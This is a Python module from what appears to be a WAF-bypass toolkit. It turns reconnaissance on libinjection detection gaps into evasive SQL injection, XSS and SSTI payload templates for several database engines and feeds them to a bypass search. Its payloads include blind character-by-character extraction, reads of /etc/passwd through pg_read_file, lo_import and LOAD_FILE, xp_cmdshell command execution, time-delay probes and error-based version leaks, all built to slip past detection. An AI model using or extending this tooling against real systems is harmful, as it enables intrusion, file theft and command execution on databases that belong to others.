"""Feedback-aware payload reconstruction.

Closes the recon→exploit loop: takes output from score-probe (boundary
payloads, invisible tokens) and libinjection-scan (gap tokens per engine),
and builds parametrized exploit *templates* that compose only undetected
syntax into valid, evasive SQL.

    score-probe result ──┐
                         ├─► PayloadReconstructor ─► Template[] ─► expand ─► seeds for bypass search
    libinjection gaps ───┘

Each Template carries a pattern with {placeholders}, the engine it targets,
and the set of gap tokens it relies on.  `expand()` generates concrete
payloads; `expand_all()` returns `(class, payload)` pairs ready for
`run_bypass()`.
"""
from __future__ import annotations

import itertools
from dataclasses import dataclass, field
from typing import Optional, Sequence


# ---- Template dataclass ---------------------------------------------------

@dataclass
class Template:
    pattern: str
    engine: str             # sqlite / postgresql / mysql / mssql / generic
    attack_class: str       # "SQL Injection", "SSTI", …
    gap_tokens: list[str] = field(default_factory=list)
    params: dict[str, list[str]] = field(default_factory=dict)
    note: str = ""

    def expand(self) -> list[str]:
        """Generate all concrete payloads from this template."""
        if not self.params:
            return [self.pattern]

        keys = sorted(self.params.keys())
        value_lists = [self.params[k] for k in keys]
        results = []
        for combo in itertools.product(*value_lists):
            mapping = dict(zip(keys, combo))
            try:
                results.append(self.pattern.format(**mapping))
            except (KeyError, IndexError):
                continue
        return results


# ---- common column/table names for blind enumeration ----------------------

_COMMON_TABLES = ["Users", "users", "accounts", "admins", "members"]
_COMMON_COLS = ["email", "password", "username", "name", "id", "secret", "token"]
_POSITIONS = ["1", "2", "3", "4", "5"]


# ---- from score-probe -----------------------------------------------------

def from_score_probe(result) -> list[Template]:
    """Build templates from a ScoreProbeResult.

    Uses boundary payloads (max-malice that still passes) as structural
    skeletons, and invisible tokens as safe building blocks.
    """
    templates: list[Template] = []

    invisible = {k.token for k in result.keyword_map if not k.detected}
    boundary = [b for b in result.boundary_payloads if b.verdict == "THROUGH"]

    for bp in boundary:
        templates.append(Template(
            pattern=bp.payload,
            engine="generic",
            attack_class=_class_from_probe(result.attack_class),
            gap_tokens=list(invisible),
            note=f"boundary payload: {bp.note}",
        ))

    if result.attack_class == "sqli":
        templates.extend(_sqli_from_invisible(invisible))
    elif result.attack_class == "xss":
        templates.extend(_xss_from_invisible(invisible))
    elif result.attack_class == "ssti":
        templates.extend(_ssti_from_invisible(invisible))

    return templates


def _class_from_probe(short: str) -> str:
    return {"sqli": "SQL Injection", "xss": "XSS Injection",
            "ssti": "SSTI"}.get(short, short)


def _sqli_from_invisible(invisible: set[str]) -> list[Template]:
    out: list[Template] = []
    if "GLOB" in invisible:
        out.append(Template(
            pattern="' GLOB '*",
            engine="sqlite", attack_class="SQL Injection",
            gap_tokens=["GLOB"],
            note="GLOB tautology (from invisible token)",
        ))
        out.append(Template(
            pattern="' GLOB '*' GLOB '",
            engine="sqlite", attack_class="SQL Injection",
            gap_tokens=["GLOB"],
            note="double GLOB absorb",
        ))
    if "COLLATE" in invisible:
        out.append(Template(
            pattern="' COLLATE NOCASE GLOB '*' GLOB '",
            engine="sqlite", attack_class="SQL Injection",
            gap_tokens=["COLLATE", "GLOB"],
            note="COLLATE + GLOB chain",
        ))
    if "ISNULL" in invisible:
        out.append(Template(
            pattern="' ISNULL GLOB '*' GLOB '",
            engine="sqlite", attack_class="SQL Injection",
            gap_tokens=["ISNULL", "GLOB"],
        ))
    if "NOTNULL" in invisible:
        out.append(Template(
            pattern="' NOTNULL GLOB '*' GLOB '",
            engine="sqlite", attack_class="SQL Injection",
            gap_tokens=["NOTNULL", "GLOB"],
        ))
    if "iif()" in invisible or "iif" in invisible:
        out.append(Template(
            pattern="' GLOB iif(1,'*','') GLOB '",
            engine="sqlite", attack_class="SQL Injection",
            gap_tokens=["iif", "GLOB"],
        ))
    if "MATCH" in invisible:
        out.append(Template(
            pattern="' MATCH '*",
            engine="sqlite", attack_class="SQL Injection",
            gap_tokens=["MATCH"],
        ))
    return out


def _xss_from_invisible(invisible: set[str]) -> list[Template]:
    out: list[Template] = []
    tags = [t for t in invisible if t.startswith("<")]
    events = [t for t in invisible if t.startswith("on")]
    funcs = [t for t in invisible if t.endswith("(")]

    for tag in tags:
        for event in events:
            for func in (funcs or ["alert("]):
                bare_tag = tag.rstrip(">").rstrip()
                out.append(Template(
                    pattern=f"{bare_tag} {event}{func}1)>",
                    engine="generic", attack_class="XSS Injection",
                    gap_tokens=[tag, event, func],
                    note=f"combo: {bare_tag}+{event}+{func}",
                ))
    return out


def _ssti_from_invisible(invisible: set[str]) -> list[Template]:
    out: list[Template] = []
    if "{{" in invisible:
        out.append(Template(
            pattern="{{7*7}}",
            engine="generic", attack_class="SSTI",
            gap_tokens=["{{", "}}"],
            note="basic Jinja2 probe",
        ))
        out.append(Template(
            pattern="{{config}}",
            engine="generic", attack_class="SSTI",
            gap_tokens=["{{", "config"],
        ))
    if "${" in invisible:
        out.append(Template(
            pattern="${7*7}",
            engine="generic", attack_class="SSTI",
            gap_tokens=["${"],
            note="expression language probe",
        ))
    return out


# ---- from libinjection gaps -----------------------------------------------

def from_libinjection_gaps(reports: Sequence) -> list[Template]:
    """Build templates from GapReport list.

    For each engine's gap tokens, build exploit templates that use ONLY
    undetected operators/functions — maximally evasive by construction.
    """
    templates: list[Template] = []
    for report in reports:
        gap_names = {g.token.name for g in report.gaps}
        if not gap_names:
            continue

        builder = _ENGINE_BUILDERS.get(report.engine)
        if builder:
            templates.extend(builder(gap_names))

    return templates


def _sqlite_templates(gaps: set[str]) -> list[Template]:
    out: list[Template] = []
    cls = "SQL Injection"

    if "GLOB" in gaps:
        out.append(Template(
            pattern="' GLOB '*", engine="sqlite", attack_class=cls,
            gap_tokens=["GLOB"],
        ))
        out.append(Template(
            pattern="' GLOB '*' GLOB '", engine="sqlite", attack_class=cls,
            gap_tokens=["GLOB"],
        ))
        # blind extraction via GLOB pattern matching
        out.append(Template(
            pattern="' GLOB '{char}*' GLOB '",
            engine="sqlite", attack_class=cls,
            gap_tokens=["GLOB"],
            params={"char": list("abcdefghijklmnopqrstuvwxyz0123456789")},
            note="blind char-by-char via GLOB pattern",
        ))

    if "GLOB" in gaps and "COLLATE" in gaps:
        out.append(Template(
            pattern="' COLLATE NOCASE GLOB '*' GLOB '",
            engine="sqlite", attack_class=cls,
            gap_tokens=["COLLATE", "GLOB"],
        ))

    if "ISNULL" in gaps:
        out.append(Template(
            pattern="' ISNULL GLOB '*' GLOB '",
            engine="sqlite", attack_class=cls,
            gap_tokens=["ISNULL", "GLOB"],
        ))

    if "NOTNULL" in gaps:
        out.append(Template(
            pattern="' NOTNULL GLOB '*' GLOB '",
            engine="sqlite", attack_class=cls,
            gap_tokens=["NOTNULL", "GLOB"],
        ))

    if "iif" in gaps:
        out.append(Template(
            pattern="' GLOB iif(1,'*','') GLOB '",
            engine="sqlite", attack_class=cls,
            gap_tokens=["iif", "GLOB"],
        ))

    if "typeof" in gaps:
        out.append(Template(
            pattern="' GLOB typeof('*') GLOB '",
            engine="sqlite", attack_class=cls,
            gap_tokens=["typeof", "GLOB"],
        ))

    if "nullif" in gaps:
        out.append(Template(
            pattern="' GLOB nullif('*','x') GLOB '",
            engine="sqlite", attack_class=cls,
            gap_tokens=["nullif", "GLOB"],
        ))

    if "quote" in gaps:
        out.append(Template(
            pattern="' GLOB quote('*') GLOB '",
            engine="sqlite", attack_class=cls,
            gap_tokens=["quote", "GLOB"],
        ))

    if "hex" in gaps:
        out.append(Template(
            pattern="hex(randomblob(1))",
            engine="sqlite", attack_class=cls,
            gap_tokens=["hex", "randomblob"],
        ))

    if "MATCH" in gaps:
        out.append(Template(
            pattern="' MATCH '*",
            engine="sqlite", attack_class=cls,
            gap_tokens=["MATCH"],
        ))

    if "ESCAPE" in gaps:
        out.append(Template(
            pattern="' ESCAPE '' GLOB '*' GLOB '",
            engine="sqlite", attack_class=cls,
            gap_tokens=["ESCAPE", "GLOB"],
        ))

    if "sqlite_version" in gaps:
        out.append(Template(
            pattern="sqlite_version()",
            engine="sqlite", attack_class=cls,
            gap_tokens=["sqlite_version"],
        ))

    if "json_extract" in gaps:
        out.append(Template(
            pattern="json_extract('{{\"a\":1}}','$.a')",
            engine="sqlite", attack_class=cls,
            gap_tokens=["json_extract"],
        ))

    return out


def _postgresql_templates(gaps: set[str]) -> list[Template]:
    out: list[Template] = []
    cls = "SQL Injection"

    if "ILIKE" in gaps:
        out.append(Template(
            pattern="' ILIKE '%",
            engine="postgresql", attack_class=cls,
            gap_tokens=["ILIKE"],
        ))

    if "SIMILAR TO" in gaps:
        out.append(Template(
            pattern="' SIMILAR TO '%",
            engine="postgresql", attack_class=cls,
            gap_tokens=["SIMILAR TO"],
        ))

    if "~" in gaps:
        out.append(Template(
            pattern="' ~ '.*",
            engine="postgresql", attack_class=cls,
            gap_tokens=["~"],
        ))

    if "::" in gaps:
        out.append(Template(
            pattern="'1'::{type}",
            engine="postgresql", attack_class=cls,
            gap_tokens=["::"],
            params={"type": ["int", "text", "boolean"]},
            note="type cast probe",
        ))

    if "pg_sleep" in gaps:
        out.append(Template(
            pattern="pg_sleep({sec})",
            engine="postgresql", attack_class=cls,
            gap_tokens=["pg_sleep"],
            params={"sec": ["3", "5", "10"]},
        ))

    if "pg_read_file" in gaps:
        out.append(Template(
            pattern="pg_read_file('{path}')",
            engine="postgresql", attack_class=cls,
            gap_tokens=["pg_read_file"],
            params={"path": ["/etc/hostname", "/etc/passwd"]},
        ))

    if "current_setting" in gaps:
        out.append(Template(
            pattern="current_setting('{key}')",
            engine="postgresql", attack_class=cls,
            gap_tokens=["current_setting"],
            params={"key": ["server_version", "data_directory", "log_directory"]},
        ))

    if "string_agg" in gaps:
        out.append(Template(
            pattern="string_agg({col},',')",
            engine="postgresql", attack_class=cls,
            gap_tokens=["string_agg"],
            params={"col": ["table_name", "column_name"]},
        ))

    if "generate_series" in gaps:
        out.append(Template(
            pattern="generate_series(1,{n})",
            engine="postgresql", attack_class=cls,
            gap_tokens=["generate_series"],
            params={"n": ["10", "100"]},
        ))

    if "lo_import" in gaps:
        out.append(Template(
            pattern="lo_import('{path}')",
            engine="postgresql", attack_class=cls,
            gap_tokens=["lo_import"],
            params={"path": ["/etc/passwd", "/etc/hostname"]},
        ))

    return out


def _mysql_templates(gaps: set[str]) -> list[Template]:
    out: list[Template] = []
    cls = "SQL Injection"

    if "RLIKE" in gaps:
        out.append(Template(
            pattern="' RLIKE '.*",
            engine="mysql", attack_class=cls,
            gap_tokens=["RLIKE"],
        ))

    if ":=" in gaps:
        out.append(Template(
            pattern="@a:=1",
            engine="mysql", attack_class=cls,
            gap_tokens=[":="],
        ))

    if "BENCHMARK" in gaps:
        out.append(Template(
            pattern="BENCHMARK({count},SHA1('test'))",
            engine="mysql", attack_class=cls,
            gap_tokens=["BENCHMARK"],
            params={"count": ["5000000", "10000000"]},
        ))

    if "LOAD_FILE" in gaps:
        out.append(Template(
            pattern="LOAD_FILE('{path}')",
            engine="mysql", attack_class=cls,
            gap_tokens=["LOAD_FILE"],
            params={"path": ["/etc/hostname", "/etc/passwd"]},
        ))

    if "@@version" in gaps:
        out.append(Template(
            pattern="@@version",
            engine="mysql", attack_class=cls,
            gap_tokens=["@@version"],
        ))

    if "EXTRACTVALUE" in gaps:
        out.append(Template(
            pattern="EXTRACTVALUE(1,CONCAT(0x7e,version()))",
            engine="mysql", attack_class=cls,
            gap_tokens=["EXTRACTVALUE"],
        ))

    if "UPDATEXML" in gaps:
        out.append(Template(
            pattern="UPDATEXML(1,CONCAT(0x7e,version()),1)",
            engine="mysql", attack_class=cls,
            gap_tokens=["UPDATEXML"],
        ))

    if "SOUNDS LIKE" in gaps:
        out.append(Template(
            pattern="' SOUNDS LIKE '",
            engine="mysql", attack_class=cls,
            gap_tokens=["SOUNDS LIKE"],
        ))

    if "EXP" in gaps:
        out.append(Template(
            pattern="EXP(~(SELECT*FROM(SELECT version())x))",
            engine="mysql", attack_class=cls,
            gap_tokens=["EXP"],
        ))

    if "JSON_EXTRACT" in gaps:
        out.append(Template(
            pattern="JSON_EXTRACT('{{\"a\":1}}','$.a')",
            engine="mysql", attack_class=cls,
            gap_tokens=["JSON_EXTRACT"],
        ))

    return out


def _mssql_templates(gaps: set[str]) -> list[Template]:
    out: list[Template] = []
    cls = "SQL Injection"

    if "WAITFOR" in gaps:
        out.append(Template(
            pattern="WAITFOR DELAY '0:0:{sec}'",
            engine="mssql", attack_class=cls,
            gap_tokens=["WAITFOR"],
            params={"sec": ["3", "5"]},
        ))

    if "OPENROWSET" in gaps:
        out.append(Template(
            pattern="OPENROWSET('SQLOLEDB','server=;','SELECT 1')",
            engine="mssql", attack_class=cls,
            gap_tokens=["OPENROWSET"],
        ))

    if "xp_cmdshell" in gaps:
        out.append(Template(
            pattern="xp_cmdshell('{cmd}')",
            engine="mssql", attack_class=cls,
            gap_tokens=["xp_cmdshell"],
            params={"cmd": ["whoami", "hostname"]},
        ))

    if "IIF" in gaps:
        out.append(Template(
            pattern="IIF(1=1,1,0)",
            engine="mssql", attack_class=cls,
            gap_tokens=["IIF"],
        ))

    if "STUFF" in gaps:
        out.append(Template(
            pattern="STUFF((SELECT 1),1,0,'')",
            engine="mssql", attack_class=cls,
            gap_tokens=["STUFF"],
        ))

    if "STRING_AGG" in gaps:
        out.append(Template(
            pattern="STRING_AGG({col},',')",
            engine="mssql", attack_class=cls,
            gap_tokens=["STRING_AGG"],
            params={"col": ["name", "type"]},
        ))

    if "DB_NAME" in gaps:
        out.append(Template(
            pattern="DB_NAME()",
            engine="mssql", attack_class=cls,
            gap_tokens=["DB_NAME"],
        ))

    if "SERVERPROPERTY" in gaps:
        out.append(Template(
            pattern="SERVERPROPERTY('{prop}')",
            engine="mssql", attack_class=cls,
            gap_tokens=["SERVERPROPERTY"],
            params={"prop": ["ProductVersion", "Edition", "MachineName"]},
        ))

    if "HOST_NAME" in gaps:
        out.append(Template(
            pattern="HOST_NAME()",
            engine="mssql", attack_class=cls,
            gap_tokens=["HOST_NAME"],
        ))

    return out


_ENGINE_BUILDERS = {
    "sqlite": _sqlite_templates,
    "postgresql": _postgresql_templates,
    "mysql": _mysql_templates,
    "mssql": _mssql_templates,
}


# ---- combine both sources -------------------------------------------------

def from_both(
    score_result: Optional[object] = None,
    gap_reports: Optional[Sequence] = None,
) -> list[Template]:
    """Combine score-probe and libinjection-scan results into one template set.

    Deduplicates by pattern and merges gap_tokens from both sources.
    """
    templates: list[Template] = []

    if score_result is not None:
        templates.extend(from_score_probe(score_result))

    if gap_reports:
        templates.extend(from_libinjection_gaps(gap_reports))

    return _dedupe(templates)


def _dedupe(templates: list[Template]) -> list[Template]:
    """Deduplicate templates by pattern, merging gap_tokens."""
    seen: dict[str, Template] = {}
    for t in templates:
        if t.pattern in seen:
            existing = seen[t.pattern]
            merged_gaps = list(set(existing.gap_tokens) | set(t.gap_tokens))
            seen[t.pattern] = Template(
                pattern=t.pattern, engine=t.engine or existing.engine,
                attack_class=t.attack_class, gap_tokens=merged_gaps,
                params={**existing.params, **t.params},
                note=existing.note or t.note,
            )
        else:
            seen[t.pattern] = t
    return list(seen.values())


# ---- expand for bypass engine ---------------------------------------------

def expand_all(templates: list[Template]) -> list[tuple[str, str]]:
    """Expand all templates into (attack_class, payload) pairs for run_bypass."""
    pairs: list[tuple[str, str]] = []
    seen: set[str] = set()
    for t in templates:
        for payload in t.expand():
            if payload not in seen:
                seen.add(payload)
                pairs.append((t.attack_class, payload))
    return pairs


# ---- convenience: full pipeline in one call --------------------------------

class PayloadReconstructor:
    """Facade: feed recon results in, get search-ready seeds out."""

    def __init__(self):
        self.templates: list[Template] = []

    def add_score_probe(self, result) -> "PayloadReconstructor":
        self.templates.extend(from_score_probe(result))
        return self

    def add_gap_reports(self, reports: Sequence) -> "PayloadReconstructor":
        self.templates.extend(from_libinjection_gaps(reports))
        return self

    def build(self) -> list[Template]:
        self.templates = _dedupe(self.templates)
        return self.templates

    def seeds(self) -> list[tuple[str, str]]:
        return expand_all(self.build())
